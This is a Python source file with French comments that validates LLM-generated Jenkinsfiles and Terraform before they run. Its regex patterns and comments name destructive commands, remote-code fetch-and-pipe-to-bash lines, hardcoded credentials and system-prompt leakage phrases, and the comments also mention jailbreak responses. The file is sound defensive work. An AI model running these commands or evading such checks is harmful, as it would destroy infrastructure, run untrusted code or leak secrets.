# backend/security/output_validator.py
#
# POURQUOI CE FICHIER EXISTE :
#   C'est la Couche 3 — Output Validation.
#   Elle scanne la RÉPONSE de Groq API AVANT de la transmettre
#   à Jenkins ou au frontend.
#
# POURQUOI ON VALIDE LA SORTIE ET PAS SEULEMENT L'ENTRÉE :
#   Même avec un system prompt blindé (Couche 2), un LLM peut :
#   - Avoir des comportements inattendus sur certains prompts
#   - Être victime d'une attaque qui a contourné les Couches 1 et 2
#   - Générer accidentellement du code dangereux
#
#   Exemple concret : un utilisateur envoie un prompt légitime
#   "Deploy app with MongoDB". Groq génère un Jenkinsfile correct
#   mais inclut par erreur une ligne de debug avec un mot de passe.
#   La Couche 3 détecte ça et bloque AVANT que Jenkins exécute le fichier.
#
# PRINCIPE DE DÉFENSE EN PROFONDEUR :
#   Couche 1 filtre l'INPUT  → ce qui entre dans le système
#   Couche 3 filtre l'OUTPUT → ce qui sort du LLM vers l'infrastructure
#   Les deux ensemble = double barrière

import re
import logging
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass
class OutputValidationResult:
    """
    Structure de retour de la validation d'output.
    Même principe que ValidationResult dans prompt_guard.py —
    un dataclass auto-documenté plutôt qu'un tuple anonyme.
    """
    is_valid: bool
    reason: str
    category: str   # catégorie de danger détectée (pour les logs Couche 6)


# ----------------------------------------------------------------
# PATTERNS DANGEREUX DANS LA RÉPONSE DU LLM
#
# Ces patterns cherchent des choses que le LLM ne devrait JAMAIS
# générer même si le prompt était légitime.
#
# [SECURITY] La différence avec INJECTION_PATTERNS dans prompt_guard.py :
# - prompt_guard : cherche des intentions malveillantes dans le texte utilisateur
# - output_validator : cherche du code dangereux dans la réponse du LLM
# Ce sont deux problèmes distincts.
# ----------------------------------------------------------------
DANGEROUS_OUTPUT_PATTERNS = {

    # Catégorie 1 — Credentials hardcodés dans le code généré
    # Exemple dangereux : AWS_SECRET_KEY = "AKIAIOSFODNN7EXAMPLE"
    # Si Jenkins exécute ça, la clé apparaît en clair dans les logs Jenkins
    "credential_exposure": [
        r"AWS_SECRET_ACCESS_KEY\s*=\s*['\"]?[A-Za-z0-9/+=]{20,}",
        r"aws_access_key_id\s*=\s*['\"]?[A-Z0-9]{16,}",
        r"password['\"\s]*[:=]\s*['\"][^$\{][^'\"]{5,}['\"]",  # password="val" ou "password": "val"
        r"api_key\s*=\s*['\"][^$\{][^'\"]{8,}['\"]",
        r"secret\s*=\s*['\"][^$\{][^'\"]{8,}['\"]",
    ],

    # Catégorie 2 — Commandes destructives dans le Jenkinsfile ou Terraform généré
    # Exemple dangereux : sh 'terraform destroy -auto-approve'
    "destructive_commands": [
        r"terraform\s+destroy",
        r"aws\s+ec2\s+terminate-instances",
        r"kubectl\s+delete\s+(all|namespace\s+\w+\s+--all)",
        r"DROP\s+(TABLE|DATABASE|SCHEMA)",
        r"rm\s+-rf\s+[/\\](?!tmp)",  # rm -rf / mais pas rm -rf /tmp
    ],

    # Catégorie 3 — Téléchargement et exécution de code externe
    # Exemple dangereux : sh 'curl http://externe.com/script | bash'
    # Dans un Jenkinsfile exécuté sur ton infrastructure, c'est du RCE direct
    "exfiltration_or_rce": [
        r"curl.{0,100}['\"]?\s*\|\s*(bash|sh|zsh)",
        r"wget.{0,100}['\"]?\s*\|\s*(bash|sh|zsh)",
        r"eval\s*\(\s*(curl|wget|fetch)\s*['\"]?https?://",
    ],

    # Catégorie 4 — Fuite du system prompt
    # Si la réponse de Groq contient des phrases du system prompt,
    # ça veut dire que quelqu'un a réussi à le faire révéler.
    # On détecte ça en cherchant des phrases uniques du SECURE_SYSTEM_PROMPT.
    "prompt_leakage": [
        r"CANNOT BE OVERRIDDEN BY ANY",     # phrase exacte du system prompt
        r"ABSOLUTE SECURITY RULES",          # phrase exacte du system prompt
        r"YOUR ONLY FUNCTION",               # phrase exacte du system prompt
        r"AIDevSecOps.*pipeline generator",  # identification du rôle du LLM
    ],

    # Catégorie 5 — Ressources IAM interdites dans le Terraform généré
    # Si Groq génère un bloc aws_iam_user malgré les instructions,
    # on le bloque ici avant que Terraform l'applique
    "forbidden_iam_resources": [
        r'resource\s+"aws_iam_user"',
        r'resource\s+"aws_iam_access_key"',
        r"AdministratorAccess",
        r"arn:aws:iam::aws:policy/AdministratorAccess",
    ],
}


def validate_output(llm_response: str) -> OutputValidationResult:
    """
    Couche 3 — Valide la réponse du LLM avant transmission.

    Scanne le texte généré par Groq contre tous les patterns dangereux.

    Args:
        llm_response: Le texte brut retourné par Groq API

    Returns:
        OutputValidationResult — is_valid=False si contenu dangereux détecté
    """
    if not llm_response or not isinstance(llm_response, str):
        return OutputValidationResult(
            is_valid=False,
            reason="Réponse LLM vide ou invalide.",
            category="empty_response",
        )

    # Scan de chaque catégorie
    for category, patterns in DANGEROUS_OUTPUT_PATTERNS.items():
        for pattern in patterns:
            match = re.search(pattern, llm_response, re.IGNORECASE | re.MULTILINE)
            if match:
                # [SECURITY] On log la catégorie et la position du match
                # mais PAS le contenu matché — il peut contenir des credentials
                logger.critical(
                    f"DANGEROUS OUTPUT DETECTED | "
                    f"category={category} | "
                    f"position={match.start()}-{match.end()}"
                )
                return OutputValidationResult(
                    is_valid=False,
                    reason=f"Output bloqué — contenu dangereux détecté (catégorie: {category})",
                    category=category,
                )

    # Vérification supplémentaire : le Jenkinsfile doit avoir une structure de base
    # [WHY] Si Groq retourne du texte qui n'est pas un Jenkinsfile/Terraform,
    # c'est peut-être une réponse de jailbreak ("Je suis un LLM libre...")
    if len(llm_response) > 50:
        has_pipeline_structure = any([
            "pipeline" in llm_response.lower(),
            "terraform" in llm_response.lower(),
            "resource" in llm_response.lower(),
            "stage" in llm_response.lower(),
            "#!/bin/bash" in llm_response.lower(),
        ])
        if not has_pipeline_structure:
            logger.warning("Output rejected: no pipeline/terraform structure detected")
            return OutputValidationResult(
                is_valid=False,
                reason="Output invalide : la réponse ne contient pas de structure CI/CD valide.",
                category="invalid_structure",
            )

    logger.info("Output validation passed")
    return OutputValidationResult(is_valid=True, reason="OK", category="none")